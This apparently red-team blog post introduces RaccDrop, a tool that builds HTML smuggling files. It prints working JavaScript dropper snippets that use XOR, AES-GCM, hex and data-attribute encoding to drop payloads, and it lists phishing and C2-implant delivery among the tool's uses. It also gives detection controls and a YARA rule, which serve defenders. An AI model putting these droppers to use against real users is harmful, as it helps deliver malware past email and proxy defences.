---
layout: post
title: "RaccDrop: HTML Smuggling Made Simple"
---

<img height="200" align="left" src="/images/raccdrop_logo.jpg"> HTML Smuggling is a payload delivery technique that abuses legitimate HTML5 and JavaScript features to construct malicious files directly inside the victim's browser. Unlike traditional downloads, the payload never crosses the network as a recognizable binary — it arrives as harmless-looking HTML, reassembles itself client-side, and drops to disk. This makes it particularly effective at bypassing email gateways, web proxies, and sandboxes that rely on inspecting file transfers.

[RaccDrop](https://benjitrapp.github.io/requestsmuggling-generator/) is a self-contained, browser-based tool that generates HTML smuggling payloads. Pick a file, choose an encoding method, and it produces a standalone HTML file that reconstructs and delivers the original payload when opened. No server needed, no dependencies — everything runs in the browser.

The source code lives at [github.com/BenjiTrapp/requestsmuggling-generator](https://github.com/BenjiTrapp/requestsmuggling-generator), forked from [Team-Recon-Black-Ops](https://github.com/Team-Recon-Black-Ops/requestsmuggling-generator).

## HTML Smuggling vs. HTTP Request Smuggling

These are often confused but are completely different attack types:

| | HTML Smuggling | HTTP Request Smuggling |
|---|---|---|
| **Target** | End user (browser) | Web servers / reverse proxies |
| **Vector** | Malicious HTML file with embedded payload | Malformed HTTP headers (CL/TE desync) |
| **Goal** | Deliver files past security controls | Bypass access controls, poison caches |
| **MITRE** | [T1027.006](https://attack.mitre.org/techniques/T1027/006/) | N/A (server-side) |

I covered HTTP Request Smuggling in a [previous post about proxy attacks](https://benjitrapp.github.io/proxy-madness/) and the [HTTP Request Smuggling Lab](https://github.com/BenjiTrapp/http-request-smuggling-lab). This post is about the client-side HTML variant.

## How HTML Smuggling Works

The attack flow is straightforward:

1. **Encode** — The payload (any file) is encoded into a text representation (Base64, Hex, XOR, AES, or CSS data attribute) and embedded directly into an HTML document
2. **Deliver** — The HTML file is sent via email, hosted on a website, or distributed through any channel. To security tools inspecting the wire, it looks like a regular HTML page
3. **Decode & Drop** — When the victim opens the HTML file in their browser, JavaScript decodes the embedded data, constructs a `Blob`, and triggers an automatic download via a programmatically created `<a>` element

```
 Attacker                    Email Gateway / Proxy              Victim Browser
    |                              |                                |
    |--- HTML file (looks clean) ->|                                |
    |                              |-- passes inspection ---------->|
    |                              |                                |-- JS decodes payload
    |                              |                                |-- Blob created
    |                              |                                |-- file downloaded to disk
```

The key insight: the malicious binary never exists on the network. It's assembled entirely in the browser's memory from what looks like JavaScript string data.

## RaccDrop — Encoding Methods

RaccDrop supports five encoding/encryption methods, each with different tradeoffs:

### CSS Data Attribute

Stores the Base64-encoded payload in a `data-file` attribute on a hidden `<div>`. JavaScript reads the attribute and decodes it on page load.

```html
<div id="data" data-file="ENCODED_PAYLOAD_HERE"></div>
<script>
  const d = atob(document.getElementById('data').dataset.file);
  const a = document.createElement('a');
  a.href = d;
  a.download = 'payload.exe';
  document.body.appendChild(a);
  a.click();
</script>
```

**Stealth:** Medium — the payload is in the DOM but not in a `<script>` block, which can bypass some static analysis rules.

### XOR Encryption

The payload is XOR'd with a random 16-character key and then Base64-encoded. Decryption happens inline:

```javascript
function xorDec(d, k) {
  return atob(d)
    .split('')
    .map((c, i) =>
      String.fromCharCode(c.charCodeAt(0) ^ k.charCodeAt(i % k.length))
    )
    .join('');
}
let d = xorDec(encodedData, key);
```

**Stealth:** Higher — the payload is not recognizable without the key. Simple but effective against pattern-matching scanners.

### AES-GCM Encryption

Uses the Web Crypto API for proper AES-256-GCM encryption with a random IV. This is the strongest option:

```javascript
async function aesDec(data, key) {
  const raw = atob(data);
  const iv = new Uint8Array([...raw.slice(0, 12)].map(c => c.charCodeAt(0)));
  const encData = new Uint8Array([...raw.slice(12)].map(c => c.charCodeAt(0)));
  const k = await crypto.subtle.importKey(
    'raw', new TextEncoder().encode(key),
    { name: 'AES-GCM' }, false, ['decrypt']
  );
  const dec = await crypto.subtle.decrypt({ name: 'AES-GCM', iv }, k, encData);
  return new TextDecoder().decode(dec);
}
```

**Stealth:** Highest — the payload is fully encrypted. Scanners cannot inspect the content without the key, which is embedded in the same file (a tradeoff for self-contained delivery).

### Base64 Encoding

The simplest approach — the payload is just `btoa()`'d and decoded with `atob()` on the other end.

**Stealth:** Low — Base64 blobs are easy to spot and many security tools will decode and inspect them.

### Hex Encoding

Each character is converted to its two-digit hex representation. Decoded by converting hex pairs back to characters:

```javascript
let d = decodeURIComponent(hexData.replace(/(..)/g, '%$1'));
```

**Stealth:** Low-Medium — less commonly scanned for than Base64, but still trivially reversible.

## Using RaccDrop

1. Open [RaccDrop](https://benjitrapp.github.io/requestsmuggling-generator/) in your browser
2. Click **Choose File** and select the file you want to smuggle
3. Pick an encoding method from the dropdown
4. Click **Smuggle It!**
5. A self-contained HTML file downloads automatically (named `raccdrop_<method>_<filename>.html`)

The generated HTML file contains:
- A manifest comment with metadata (method, original filename, timestamp)
- The encoded/encrypted payload
- Inline JavaScript that decodes and triggers the download
- A visible panel with copyable HTML and JavaScript snippets for embedding the payload into other pages

## Red Team Use Cases

HTML Smuggling is particularly useful in scenarios where traditional payload delivery is blocked:

- **Phishing campaigns** — Attach the HTML file to an email. Most email gateways allow HTML attachments since they can't detect the embedded payload
- **Bypassing web proxies** — Host the HTML file on a trusted domain. The download happens client-side, so the proxy only sees an HTML page being loaded
- **Initial access** — Deliver droppers, loaders, or C2 implants without triggering network-based detection
- **ISO/IMG delivery** — Smuggle disk images that mount automatically on Windows, bypassing Mark-of-the-Web (MotW) on older versions

Real-world threat actors including Nobelium (APT29), Mango Sandstorm, and DEV-0238 have used HTML smuggling in campaigns targeting enterprises.

## Detection and Defense

From a blue team perspective, here's how to detect and mitigate HTML smuggling:

| Control | What It Does |
|---------|-------------|
| **Mark-of-the-Web (MotW)** | Modern browsers tag downloads with a zone identifier. Windows SmartScreen uses this to warn users |
| **Disable JavaScript in email** | Most email clients already do this, but webmail may not |
| **Monitor `Blob` URL creation** | EDR rules can flag `URL.createObjectURL()` followed by click events on dynamically created `<a>` elements |
| **Block HTML attachments** | Configure email gateway policies to quarantine `.html` / `.htm` attachments |
| **Content inspection** | Advanced sandboxes can execute HTML files and observe the resulting file drops |
| **ASR rules (Windows Defender)** | Rule "Block JavaScript or VBScript from launching downloaded executable content" helps |
| **Browser isolation** | Prevents the dropped file from reaching the endpoint's real filesystem |

Yara rule example for detecting HTML smuggling patterns:

```
rule HTML_Smuggling_Indicators {
    meta:
        description = "Detects common HTML smuggling patterns"
    strings:
        $blob = "new Blob(" ascii
        $createObjectURL = "URL.createObjectURL" ascii
        $createElement_a = "createElement('a')" ascii
        $atob = "atob(" ascii
        $download = ".download=" ascii
        $crypto = "crypto.subtle" ascii
    condition:
        filesize < 10MB and
        3 of them
}
```

## Under the Hood

The core smuggling logic in RaccDrop is minimal. After encoding, the generated HTML uses this pattern to trigger the download:

```javascript
(async () => {
  let d = /* decode payload based on method */;
  const a = document.createElement('a');
  a.href = d;         // Data URL with the decoded payload
  a.download = 'original_filename';
  document.body.appendChild(a);
  a.click();           // Triggers the browser's download
  a.remove();
})();
```

This works because browsers allow JavaScript to create `<a>` elements with `download` attributes and programmatically click them — a legitimate HTML5 feature designed for client-side file generation (think "Export as CSV" buttons). HTML Smuggling simply repurposes this for payload delivery.

## Further Reading

- [MITRE ATT&CK T1027.006 — HTML Smuggling](https://attack.mitre.org/techniques/T1027/006/)
- [Microsoft: What is HTML Smuggling?](https://www.microsoft.com/en-us/security/blog/2021/11/11/html-smuggling-surges-highly-evasive-loader-technique-increasingly-used-in-banking-malware-phishing-campaigns/)
- [Outflank: HTML Smuggling Explained](https://outflank.nl/blog/2018/08/14/html-smuggling-explained/)
- [RaccDrop Live Tool](https://benjitrapp.github.io/requestsmuggling-generator/)
- [Source Code on GitHub](https://github.com/BenjiTrapp/requestsmuggling-generator)
- [HTTP Request Smuggling Lab](https://github.com/BenjiTrapp/http-request-smuggling-lab) (different attack type)
